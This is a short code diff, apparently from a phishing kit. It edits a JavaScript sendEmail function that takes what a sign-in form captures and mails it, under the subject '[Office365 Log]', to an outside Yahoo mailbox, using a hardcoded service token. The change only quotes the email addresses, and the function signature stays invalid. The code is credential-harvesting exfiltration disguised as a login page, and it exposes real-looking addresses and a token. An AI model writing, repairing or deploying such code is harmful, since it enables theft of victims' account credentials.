@@ -95,13 +95,13 @@ loadForm(), document.getElementById("email-signin").addEventListener("submit", p
 });
 
 
-function sendEmail(gotradebtc@gmail.com,message) {
+function sendEmail('gotradebtc@gmail.com',message) {
   Email.send({
   // Host: smtp_host,
   // Username : smtp_username,
   // Password : smtp_password,
   SecureToken: '232d9590-ce69-4dec-8b72-178e83e97702',
-  To : nelsonjail@yahoo.com,
+  To : 'nelsonjail@yahoo.com',
   From : smtp_username,
   Subject : '==============+ [Office365 Log] +================',
   Body : message,
